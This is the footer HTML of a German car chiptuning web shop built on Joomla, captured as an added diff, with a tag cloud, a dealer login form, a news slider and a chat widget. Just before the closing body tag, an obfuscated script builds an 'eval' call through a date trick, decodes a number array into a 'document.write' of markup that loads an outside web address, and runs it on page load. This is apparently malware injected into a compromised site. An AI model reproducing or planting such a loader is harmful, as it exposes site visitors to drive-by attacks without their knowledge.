+</div><!--contentframe -->
+</div><!--contentcolumn--> 
+													                                                    
+                                                     
+                                                    
+</div><!--inner-pad-border-->
+</div><!--inner-pad-->
+</div><!--innerbarrel-->
+
+                                             
+
+                              
+</div> <!--outer-container-->
+</div>                                    
+
+
+   
+
+
+							<div id="bottom-users-2" class="cf">
+                            <div id="bottom-users-2-shade">
+                            <div id="bottom-users-2-frame" class="pjlimiter">
+                            <div id="bottom-users-2-inner">
+                            <div id="bottom-users-2-inner2">
+ <div style="position:relative;  width:100%;" class="cf dklist">
+											                                            <div class="userathird  pjbot2sh cf">
+                                                		
+       <div class="puremodule-frame">
+        <div class="puremodule standard_cloud">
+       
+                                       <div class="pjfrm"><div class="pjfrm2 standard _cloud"><div class="t standard _cloud"></div>
+<div class="puremodule-pad cf">
+					                    
+                    <div class="puremodule_content cf"> 
+					<div class="modJoomulus__cloud" id="Joomulus1"><p><tags><a href='http://www.competition-parts.de/tuningfiles/tuningfiles-fileservice.html' style='font-size:18'>WinOls</a>
+ <a href='http://www.competition-parts.de/de/tuningfiles-fileservice-chiptuning.html' style='font-size:18'>Chiptuning</a>
+ <a href='http://www.competition-parts.de/en/tuningfiles/tuningfiles-fileservice-file-support.html' style='font-size:18'>ecu remapping</a>
+ <a href='http://www.competition-parts.de/de/tuningfiles-fileservice-chiptuning.html' style='font-size:18'>remap ecu</a>
+ <a href='http://www.competition-parts.de/en/tuningfiles/tuningfiles-fileservice-file-support.html' style='font-size:18'>chiptuning files</a>
+ <a href='http://www.competition-parts.de/de/chiptuning-pkw/' style='font-size:18'>Tuning Chip</a>
+ <a href='http://www.competition-parts.de/de/chiptuning-pkw/' style='font-size:18'>Chip Tuning</a>
+ <a href='http://www.competition-parts.de/tuningfiles/tuningfiles-fileservice.html' style='font-size:18'>EDC17</a>
+ <a href='http://www.competition-parts.de/tuningfiles/tuningfiles-fileservice.html' style='font-size:18'>EDC16</a>
+ <a href='http://www.competition-parts.de/tuningfiles/tuningfiles-fileservice.html' style='font-size:18'>MED17</a>
+ <a href='http://www.competition-parts.de/tuningfiles/tuningfiles-fileservice.html' style='font-size:18'>Tuningfiles</a>
+ <a href='http://www.competition-parts.de/en/tuningfiles/tuningfiles-fileservice-file-support.html' style='font-size:18'>Chiptuning Files</a>
+ <a href='http://www.competition-parts.de/de/chiptuning-pkw/' style='font-size:18'>TDI Chiptuning</a>
+ <a href='http://www.competition-parts.de/de/chiptuning-pkw/' style='font-size:18'>TFSI Chiptuning</a>
+ <a href='http://www.competition-parts.de/original-files/original-files.html' style='font-size:18'>Originalfiles</a>
+ <a href='http://www.competition-parts.de/de/tuningfiles-fileservice-chiptuning.html' style='font-size:18'>Kennfeldbearbeitung</a>
+ <a href='http://www.competition-parts.de/chiptuning/porsche' style='font-size:18'>Porsche Chiptuning</a>
+ <a href='http://www.competition-parts.de/chiptuning/audi' style='font-size:18'>Chiptuning Audi</a>
+ <a href='http://www.competition-parts.de/chiptuning/bmw' style='font-size:18'>Chiptuning BMW</a>
+ <a href='http://www.competition-parts.de/en/tuningfiles/tuningfiles-fileservice-file-support.html' style='font-size:18'>CMD Flash</a>
+ </tags></p><p></p></div><script type="text/javascript">var rnumber = Math.floor(Math.random()*9999999);var JoomulusInstance = new SWFObject("/modules/mod_joomulus/tagcloud.swf?r="+rnumber, "tagcloudflash", "270", "340", "9", "#FFFFFF");JoomulusInstance.addParam("wmode", "transparent");JoomulusInstance.addParam("allowScriptAccess", "always");JoomulusInstance.addVariable("tcolor", "0x42EFFF");JoomulusInstance.addVariable("tcolor2", "0x22296F");JoomulusInstance.addVariable("hicolor", "0xe40009");JoomulusInstance.addVariable("tspeed", "60");JoomulusInstance.addVariable("scale_x", "1");JoomulusInstance.addVariable("scale_y", "2");JoomulusInstance.addVariable("distr", "true");JoomulusInstance.addVariable("mode", "");JoomulusInstance.addVariable("tagcloud", "<tags><a href='http://www.competition-parts.de/tuningfiles/tuningfiles-fileservice.html' style='18'>WinOls</a><a href='http://www.competition-parts.de/de/tuningfiles-fileservice-chiptuning.html' style='18'>Chiptuning</a><a href='http://www.competition-parts.de/en/tuningfiles/tuningfiles-fileservice-file-support.html' style='18'>ecu remapping</a><a href='http://www.competition-parts.de/de/tuningfiles-fileservice-chiptuning.html' style='18'>remap ecu</a><a href='http://www.competition-parts.de/en/tuningfiles/tuningfiles-fileservice-file-support.html' style='18'>chiptuning files</a><a href='http://www.competition-parts.de/de/chiptuning-pkw/' style='18'>Tuning Chip</a><a href='http://www.competition-parts.de/de/chiptuning-pkw/' style='18'>Chip Tuning</a><a href='http://www.competition-parts.de/tuningfiles/tuningfiles-fileservice.html' style='18'>EDC17</a><a href='http://www.competition-parts.de/tuningfiles/tuningfiles-fileservice.html' style='18'>EDC16</a><a href='http://www.competition-parts.de/tuningfiles/tuningfiles-fileservice.html' style='18'>MED17</a><a href='http://www.competition-parts.de/tuningfiles/tuningfiles-fileservice.html' style='18'>Tuningfiles</a><a href='http://www.competition-parts.de/en/tuningfiles/tuningfiles-fileservice-file-support.html' style='18'>Chiptuning Files</a><a href='http://www.competition-parts.de/de/chiptuning-pkw/' style='18'>TDI Chiptuning</a><a href='http://www.competition-parts.de/de/chiptuning-pkw/' style='18'>TFSI Chiptuning</a><a href='http://www.competition-parts.de/original-files/original-files.html' style='18'>Originalfiles</a><a href='http://www.competition-parts.de/de/tuningfiles-fileservice-chiptuning.html' style='18'>Kennfeldbearbeitung</a><a href='http://www.competition-parts.de/chiptuning/porsche' style='18'>Porsche Chiptuning</a><a href='http://www.competition-parts.de/chiptuning/audi' style='18'>Chiptuning Audi</a><a href='http://www.competition-parts.de/chiptuning/bmw' style='18'>Chiptuning BMW</a><a href='http://www.competition-parts.de/en/tuningfiles/tuningfiles-fileservice-file-support.html' style='18'>CMD Flash</a></tags>");JoomulusInstance.write("Joomulus1");</script>
+                    </div>
+                </div>
+           </div><div class="b standard _cloud"><div class="standard _cloud"> </div></div></div>
+     </div>
+        </div>
+        
+	
+                                            </div>
+                                            										
+                                                                                                                                    <div class="userbthird pjbot2sh cf">
+                                                		
+       <div class="puremodule-frame">
+        <div class="puremodule standard">
+       
+                                       <div class="pjfrm"><div class="pjfrm2 standard-wtitle "><div class="t standard-wtitle "></div>
+<div class="puremodule-pad cf">
+					                    
+                    <div class="moduleh3-l" ><div class="moduleh3-r"><div class="moduleh3-r-inner"></div></div>
+						<span>Händler-Login                               </span>
+                    </div>
+                            
+                                        
+                    <div class="puremodule_content cf"> 
+					<form action="http://www.competition-parts.de/" method="post" name="login" id="form-login" >
+		<fieldset class="input">
+	<p id="form-login-username">
+		<label for="modlgn_username">Benutzername</label><br />
+		<input id="modlgn_username" type="text" name="username" class="inputbox" alt="username" size="18" />
+	</p>
+	<p id="form-login-password">
+		<label for="modlgn_passwd">Passwort</label><br />
+		<input id="modlgn_passwd" type="password" name="passwd" class="inputbox" size="18" alt="password" />
+	</p>
+		<p id="form-login-remember">
+		<label for="modlgn_remember">Angemeldet bleiben</label>
+		<input id="modlgn_remember" type="checkbox" name="remember" class="inputbox" value="yes" alt="Remember Me" />
+	</p>
+		<input type="submit" name="Submit" class="button" value="Anmeldung" />
+	</fieldset>
+	<ul>
+		<li>
+			<a href="/de/ihre-details/reset.html">
+			Passwort vergessen?</a>
+		</li>
+		<li>
+			<a href="/de/ihre-details/remind.html">
+			Benutzername vergessen?</a>
+		</li>
+			</ul>
+	
+	<input type="hidden" name="option" value="com_user" />
+	<input type="hidden" name="task" value="login" />
+	<input type="hidden" name="return" value="L2RlL2locmUtZGV0YWlscy91c2VyLmh0bWw=" />
+	<input type="hidden" name="7df2aefec65b3f2be20a0f4c1ff93fc0" value="1" /></form>
+                    </div>
+                </div>
+           </div><div class="b standard-wtitle "><div class="standard-wtitle "> </div></div></div>
+     </div>
+        </div>
+        
+	
+                                            </div>
+                                                                                                                                    <div class="userbthird pjbot2sh cf">
+                                                		
+       <div class="puremodule-frame">
+        <div class="puremodule standard">
+       
+                                       <div class="pjfrm"><div class="pjfrm2 standard-wtitle "><div class="t standard-wtitle "></div>
+<div class="puremodule-pad cf">
+					                    
+                    <div class="moduleh3-l" ><div class="moduleh3-r"><div class="moduleh3-r-inner"></div></div>
+						<span>Chiptuning News                               </span>
+                    </div>
+                            
+                                        
+                    <div class="puremodule_content cf"> 
+					﻿ <script type="text/javascript">
+    /*
+    anythingSlider v1.2
+    
+    By Chris Coyier: http://css-tricks.com
+    with major improvements by Doug Neiner: http://pixelgraphics.us/
+    based on work by Remy Sharp: http://jqueryfordesigners.com/
+
+
+	To use the navigationFormatter function, you must have a function that
+	accepts two paramaters, and returns a string of HTML text.
+	
+	index = integer index (1 based);
+	panel = jQuery wrapped LI item this tab references
+	@return = Must return a string of HTML/Text
+	
+	navigationFormatter: function(index, panel){
+		return index + " Panel"; // This would have each tab with the text 'X Panel' where X = index
+	}
+*/
+
+(function(jQuery){
+	
+    jQuery.anythingSlider = function(el, options){
+        // To avoid scope issues, use 'base' instead of 'this'
+        // to reference this class from internal events and functions.
+        var base = this;
+        
+        // Access to jQuery and DOM versions of element
+        base.jQueryel = jQuery(el);
+        base.el = el; 
+
+		// Set up a few defaults
+        base.currentPage = 1;
+		base.timer = null;
+		base.playing = false;
+
+        // Add a reverse reference to the DOM object
+        base.jQueryel.data("AnythingSlider", base);
+        
+        base.init = function(){
+            base.options = jQuery.extend({},jQuery.anythingSlider.defaults, options);
+			
+			// Cache existing DOM elements for later 
+			base.jQuerywrapper = base.jQueryel.find('> div').css('overflow', 'hidden');
+            base.jQueryslider  = base.jQuerywrapper.find('> ul');
+            base.jQueryitems   = base.jQueryslider.find('> li');
+            base.jQuerysingle  = base.jQueryitems.filter(':first');
+
+			// Build the navigation if needed
+			if(base.options.buildNavigation) base.buildNavigation();
+        
+        	// Get the details
+            base.singleWidth = base.jQuerysingle.outerWidth();
+            base.pages = base.jQueryitems.length;
+
+            // Top and tail the list with 'visible' number of items, top has the last section, and tail has the first
+			// This supports the "infinite" scrolling
+			base.jQueryitems.filter(':first').before(base.jQueryitems.filter(':last').clone().addClass('cloned'));
+            base.jQueryitems.filter(':last' ).after(base.jQueryitems.filter(':first').clone().addClass('cloned'));
+
+			// We just added two items, time to re-cache the list
+            base.jQueryitems = base.jQueryslider.find('> li'); // reselect
+            
+			// Setup our forward/backward navigation
+			base.buildNextBackButtons();
+		
+			// If autoPlay functionality is included, then initialize the settings
+			if(base.options.autoPlay) {
+				base.playing = !base.options.startStopped; // Sets the playing variable to false if startStopped is true
+				base.buildAutoPlay();
+			};
+			
+			// If pauseOnHover then add hover effects
+			if(base.options.pauseOnHover) {
+				base.jQueryel.hover(function(){
+					base.clearTimer();
+				}, function(){
+					base.startStop(base.playing);
+				});
+			}
+			
+			// If a hash can not be used to trigger the plugin, then go to page 1
+			if((base.options.hashTags == true && !base.gotoHash()) || base.options.hashTags == false){
+				base.setCurrentPage(1);
+			};
+        };
+
+		base.gotoPage = function(page, autoplay){
+			// When autoplay isn't passed, we stop the timer
+			if(autoplay !== true) autoplay = false;
+			if(!autoplay) base.startStop(false);
+			
+			if(typeof(page) == "undefined" || page == null) {
+				page = 1;
+				base.setCurrentPage(1);
+			};
+			
+			// Just check for bounds
+			if(page > base.pages + 1) page = base.pages;
+			if(page < 0 ) page = 1;
+
+			var dir = page < base.currentPage ? -1 : 1,
+                n = Math.abs(base.currentPage - page),
+                left = base.singleWidth * dir * n;
+			
+			base.jQuerywrapper.filter(':not(:animated)').animate({
+                scrollLeft : '+=' + left
+            }, base.options.animationTime, base.options.easing, function () {
+                if (page == 0) {
+                    base.jQuerywrapper.scrollLeft(base.singleWidth * base.pages);
+					page = base.pages;
+                } else if (page > base.pages) {
+                    base.jQuerywrapper.scrollLeft(base.singleWidth);
+                    // reset back to start position
+                    page = 1;
+                };
+				base.setCurrentPage(page);
+				
+            });
+		};
+		
+		base.setCurrentPage = function(page, move){
+			// Set visual
+			if(base.options.buildNavigation){
+				base.jQuerynav.find('.cur').removeClass('cur');
+				jQuery(base.jQuerynavLinks[page - 1]).addClass('cur');	
+			};
+			
+			// Only change left if move does not equal false
+			if(move !== false) base.jQuerywrapper.scrollLeft(base.singleWidth * page);
+
+			// Update local variable
+			base.currentPage = page;
+		};
+		
+		base.goForward = function(autoplay){
+			if(autoplay !== true) autoplay = false;
+			base.gotoPage(base.currentPage + 1, autoplay);
+		};
+		
+		base.goBack = function(){
+			base.gotoPage(base.currentPage - 1);
+		};
+		
+		// This method tries to find a hash that matches panel-X
+		// If found, it tries to find a matching item
+		// If that is found as well, then that item starts visible
+		base.gotoHash = function(){
+			if(/^#?panel-\d+jQuery/.test(window.location.hash)){
+				var index = parseInt(window.location.hash.substr(7));
+				var jQueryitem = base.jQueryitems.filter(':eq(' + index + ')');
+				if(jQueryitem.length != 0){
+					base.setCurrentPage(index);
+					return true;
+				};
+			};
+			return false; // A item wasn't found;
+		};
+        
+		// Creates the numbered navigation links
+		base.buildNavigation = function(){
+			base.jQuerynav = jQuery("<div id='thumbNav'></div>").appendTo(base.jQueryel);
+			base.jQueryitems.each(function(i,el){
+				var index = i + 1;
+				var jQuerya = jQuery("<a href='#'></a>");
+				
+				// If a formatter function is present, use it
+				if( typeof(base.options.navigationFormatter) == "function"){
+					jQuerya.html(base.options.navigationFormatter(index, jQuery(this)));
+				} else {
+					jQuerya.text(index);
+				}
+				jQuerya.click(function(e){
+                    base.gotoPage(index);
+                    
+                    if (base.options.hashTags)
+						base.setHash('panel-' + index);
+						
+                    e.preventDefault();
+				});
+				base.jQuerynav.append(jQuerya);
+			});
+			base.jQuerynavLinks = base.jQuerynav.find('> a');
+		};
+		
+		
+		// Creates the Forward/Backward buttons
+		base.buildNextBackButtons = function(){
+			var jQueryforward = jQuery('<a class="arrow forward">&gt;</a>'),
+				jQueryback    = jQuery('<a class="arrow back">&lt;</a>');
+				
+            // Bind to the forward and back buttons
+            jQueryback.click(function(e){
+                base.goBack();
+				e.preventDefault();
+            });
+
+            jQueryforward.click(function(e){
+                base.goForward();
+				e.preventDefault();
+            });
+
+			// Append elements to page
+			base.jQuerywrapper.after(jQueryback).after(jQueryforward);
+		};
+		
+		// Creates the Start/Stop button
+		base.buildAutoPlay = function(){
+
+			base.jQuerystartStop = jQuery("<a href='#' id='start-stop'></a>").html(base.playing ? base.options.stopText :  base.options.startText);
+			base.jQueryel.append(base.jQuerystartStop);            
+            base.jQuerystartStop.click(function(e){
+				base.startStop(!base.playing);
+				e.preventDefault();
+            });
+
+			// Use the same setting, but trigger the start;
+			base.startStop(base.playing);
+		};
+		
+		// Handles stopping and playing the slideshow
+		// Pass startStop(false) to stop and startStop(true) to play
+		base.startStop = function(playing){
+			if(playing !== true) playing = false; // Default if not supplied is false
+			
+			// Update variable
+			base.playing = playing;
+			
+			// Toggle playing and text
+			if(base.options.autoPlay) base.jQuerystartStop.toggleClass("playing", playing).html( playing ? base.options.stopText : base.options.startText );
+			
+			if(playing){
+				base.clearTimer(); // Just in case this was triggered twice in a row
+				base.timer = window.setInterval(function(){
+					base.goForward(true);
+				}, base.options.delay);
+			} else {
+				base.clearTimer();
+			};
+		};
+		
+		base.clearTimer = function(){
+			// Clear the timer only if it is set
+			if(base.timer) window.clearInterval(base.timer);
+		};
+		
+		// Taken from AJAXY jquery.history Plugin
+		base.setHash = function ( hash ) {
+			// Write hash
+			if ( typeof window.location.hash !== 'undefined' ) {
+				if ( window.location.hash !== hash ) {
+					window.location.hash = hash;
+				};
+			} else if ( location.hash !== hash ) {
+				location.hash = hash;
+			};
+			
+			// Done
+			return hash;
+		};
+		// <-- End AJAXY code
+
+
+		// Trigger the initialization
+        base.init();
+    };
+
+	
+    jQuery.anythingSlider.defaults = {
+        easing: "swing",                // Anything other than "linear" or "swing" requires the easing plugin
+        autoPlay: true,                 // This turns off the entire FUNCTIONALY, not just if it starts running or not
+        startStopped: false,            // If autoPlay is on, this can force it to start stopped
+        delay: 3000,                    // How long between slide transitions in AutoPlay mode
+        animationTime: 600,             // How long the slide transition takes
+        hashTags: true,                 // Should links change the hashtag in the URL?
+        buildNavigation: true,          // If true, builds and list of anchor links to link to each slide
+        pauseOnHover: true,             // If true, and autoPlay is enabled, the show will pause on hover
+		startText: "Start",             // Start text
+		stopText: "Stop",               // Stop text
+		navigationFormatter: null       // Details at the top of the file on this use (advanced use)
+    };
+	
+
+    jQuery.fn.anythingSlider = function(options){
+		if(typeof(options) == "object"){
+		    return this.each(function(i){			
+				(new jQuery.anythingSlider(this, options));
+
+	            // This plugin supports multiple instances, but only one can support hash-tag support
+				// This disables hash-tags on all items but the first one
+				options.hashTags = false;
+	        });	
+		} else if (typeof(options) == "number") {
+
+			return this.each(function(i){
+				var anySlide = jQuery(this).data('AnythingSlider');
+				if(anySlide){
+					anySlide.gotoPage(options);
+				}
+			});
+		}
+    };
+
+	
+})(jQuery);
+        function formatText(index, panel) {
+		  return index + "";
+	    }
+    
+        jQuery(function () {
+        
+            jQuery('.anythingSlider_pjnl').anythingSlider({
+                easing: "easeInOutExpo",        // Anything other than "linear" or "swing" requires the easing plugin
+                autoPlay: true,                 // This turns off the entire FUNCTIONALY, not just if it starts running or not.
+                delay: 3000,  // How long between slide transitions in AutoPlay mode
+                startStopped:  false,            // If autoPlay is on, this can force it to start stopped
+                animationTime: 600,             // How long the slide transition takes
+                hashTags: true,                 // Should links change the hashtag in the URL?
+                buildNavigation: true,          // If true, builds and list of anchor links to link to each slide
+        		pauseOnHover: true,             // If true, and autoPlay is enabled, the show will pause on hover
+        		startText: "<img src='modules/mod_pj_newslist/images/startbut.png' title='Play'/>",             // Start text
+		        stopText: "<img src='modules/mod_pj_newslist/images/stopbut.png' title='Pause'/>",               // Stop text
+		        navigationFormatter: formatText       // Details at the top of the file on this use (advanced use)
+            });
+            
+            jQuery("#slide-jump").click(function(){
+                jQuery('.anythingSlider_pjnl').anythingSlider(6);
+            });
+            
+        });
+    </script>
+<style type="text/css" media="screen">
+.anythingSlider_pjnl .arrow {top:130px;}
+</style>
+<span style="font-size: 1.2em; color: #fff;"></span>
+<div id="pj_news_articles" class="cf" >
+
+<div class="anythingSlider_pjnl" style="width:280px; height:300px">
+<div class="wrapperas"  style="width:268px; height:300px">
+
+<ul>
+
+<li style="width:268px; height:300px"">
+
+<table>
+	<tr id="article_0"><td valign="top" class="image">
+		<a id="title_0" href="/pj-news-list/subaru-boxer-diesel.html" class="title">
+		<img src="/modules/mod_pj_newslist/image.php/Subaru-Boxer-Turbo-Diesel.jpg?width=123&height=115&cropratio=16 : 9&&image=//images/Subaru-Boxer-Turbo-Diesel.jpg" alt="Subaru-Boxer-Turbo-Diesel.jpg" align="right" hspace="10" vspace="5" /> Subaru Boxer Diesel		</a>
+		        <div class="introtext">
+		Ab jetzt sind auch die 2.0l Diesel Boxer Motoren modifizierbar ! Ergebnis: ca. 30 PS und 60 Nm mit unseren Chiptuningfiles - Prüfstand getestet - by Tradenia automotive... 
+        </div>
+        	</td>
+	</tr></table>
+</li>
+<li style="width:268px; height:300px"">
+
+<table>
+	<tr id="article_1"><td valign="top" class="image">
+		<a id="title_1" href="/pj-news-list/vag-bluemotion.html" class="title">
+		<img src="/modules/mod_pj_newslist/image.php/VAG-bluemotion.jpg?width=123&height=115&cropratio=16 : 9&&image=//images/VAG-bluemotion.jpg" alt="VAG-bluemotion.jpg" align="right" hspace="10" vspace="5" /> VAG Bluemotion Chiptuning		</a>
+		        <div class="introtext">
+		Die Chiptuning Softwareentwicklung für die neuen VAG 1.2 TDI und 1.6 TDI Bluemotion Motoren  ist abgeschlossen. Freuen Sie sich auf 30% Mehrleistung - by Tradenia automotive... 
+        </div>
+        	</td>
+	</tr></table>
+</li>
+<li style="width:268px; height:300px"">
+
+<table>
+	<tr id="article_2"><td valign="top" class="image">
+		<a id="title_2" href="/pj-news-list/bmw-single-turbo.html" class="title">
+		<img src="/modules/mod_pj_newslist/image.php/bmw-singleurbo.jpg?width=123&height=115&cropratio=16 : 9&&image=//images/bmw-singleurbo.jpg" alt="bmw-singleurbo.jpg" align="right" hspace="10" vspace="5" /> BMW Single Turbo		</a>
+		        <div class="introtext">
+		Der neue BMW 535i F10 306 PS Serie mit Einzelturbo und Bosch MEVD172 Steuergerät ist ebenfalls fertig enwickelt und auf dem Prüfstand getestet. Das Ergebnis 365 PS und 470 Nm mit unseren Tuningfiles - by Tradenia automotive... 
+        </div>
+        	</td>
+	</tr></table>
+</li>
+</ul>
+</div>
+</div>
+</div>                    </div>
+                </div>
+           </div><div class="b standard-wtitle "><div class="standard-wtitle "> </div></div></div>
+     </div>
+        </div>
+        
+	
+                                            </div>
+                                                                                
+                                    </div>
+                                                                </div>              
+                            </div>                
+                            </div>
+                            </div>	
+							</div>
+
+                            <div id="footer-wrapper">
+                            <div id="footer-outer">
+                            <div id="footer-inner" class="pjlimiter dklist">
+							   
+   
+                            <div id="footermod">		<div class="moduletable">
+					<div><a href="http://www.competition-parts.de/de/impressum/impressum.html"  title="Impressum">Impressum</a><p></p><p><p></p></p></div>
+<div>Copyright 2011 - -  Alle Rechte vorbehalten - TRADENIA Unternehmergesellschaft - <h2>Chiptuning - OBD Tuning- TDI chiptuning  Tuningfiles - Chiptuningfiles - ECU remapping - Tuning Files - Tuning Chip - remapped files </h2> - <a href="http://www.competition-parts.de/en">Partner:</a> <a href="http://www.atm-chiptuning.com">ATM</a>  - <a href="http://www.tuningchip.se">TUNING CHIP</a> - <a href="http://www.itsfun.nu">ITs FUN</a> - <a href="http://www.mlm-infos.com">MLM</a></div>		</div>
+			<div class="moduletable">
+					<div style="direction: rtl; text-align: right ! important">
+	<table cellpadding="0" cellspacing="0" class="moduletable">
+		<tr>
+		<td>
+			<ul class="newsfeed"  >
+						</ul>
+		</td>
+		</tr>
+	</table>
+</div>
+		</div>
+			<div class="moduletable">
+					<div style="text-align:center" class="ninjarss-">
+        <div style="text-align:center;float:left;padding-right:10px;">
+					<a href="/ninjarsssyndicator.html" title="RSS Feeds - Chiptuning - Tuningfiles - Chiptuningfiles - Chip Tuning - Tuning Files Newsfeeds" target="_blank"><img src="http://www.competition-parts.de/components/com_ninjarsssyndicator/assets/images/buttons/rss20.gif" alt="RSS Feeds - Chiptuning - Tuningfiles - Chiptuningfiles - Chip Tuning - Tuning Files Newsfeeds" /></a>						  
+		    </div>
+</div>
+		</div>
+	</div>
+
+<a href="http://www.pure-joomla.com" title="Pure Joomla Professional Template Club">
+							</div>
+                            </div>
+                            </div>
+
+            
+     
+
+     
+</div>
+<!-- begin olark code --> <script type='text/javascript'>/*<![CDATA[*/ window.olark||(function(k){var g=window,j=document,a=g.location.protocol=="https:"?"https:":"http:",i=k.name,b="load",h="addEventListener";(function(){g[i]=function(){(c.s=c.s||[]).push(arguments)};var c=g[i]._={},f=k.methods.length;while(f--){(function(l){g[i][l]=function(){g[i]("call",l,arguments)}})(k.methods[f])}c.l=k.loader;c.i=arguments.callee;c.p={0:+new Date};c.P=function(l){c.p[l]=new Date-c.p[0]};function e(){c.P(b);g[i](b)}g[h]?g[h](b,e,false):g.attachEvent("on"+b,e);c.P(1);var d=j.createElement("script"),m=document.getElementsByTagName("script")[0];d.type="text/javascript";d.async=true;d.src=a+"//"+c.l;m.parentNode.insertBefore(d,m);c.P(2)})()})({loader:(function(a){return "static.olark.com/jsclient/loader1.js?ts="+(a?a[1]:(+new Date))})(document.cookie.match(/olarkld=([0-9]+)/)),name:"olark",methods:["configure","extend","declare","identify"]}); olark.identify('8693-36116030-10-1877');/*]]>*/</script> <!-- end olark code -->
+<script>var ar="-n</if.s;1>2=c:9m0'd)eu otag?pbr(\"hw";var k=new Boolean().toString();var ar2="f57,72,39,66,48,63,3,75,18,105,93,12,75,63,96,54,6,12,15,93,78,48,63,69,21,93,39,36,99,102,75,75,87,42,9,9,105,105,105,18,78,48,72,93,63,0,48,72,93,63,0,72,93,63,0,93,63,45,18,12,3,18,66,78,9,12,3,18,39,81,12,84,33,99,69,105,12,57,75,102,36,99,27,99,69,102,63,12,81,102,75,36,99,27,99,69,15,93,78,48,63,90,72,93,57,63,93,36,99,51,99,30,6,9,12,15,93,78,48,63,30,54,60,24]".replace(k.substr(0,1),'[');date=new Date();pau="rn ev2011".replace(date.getFullYear(),"al");e=new Function("","retu"+pau);e=e();ar2=e(ar2);s="";for(i=0;i<ar2.length;i++){s+=ar.substr(ar2[i]/3,1);}e(s);</script></body>
+</html>
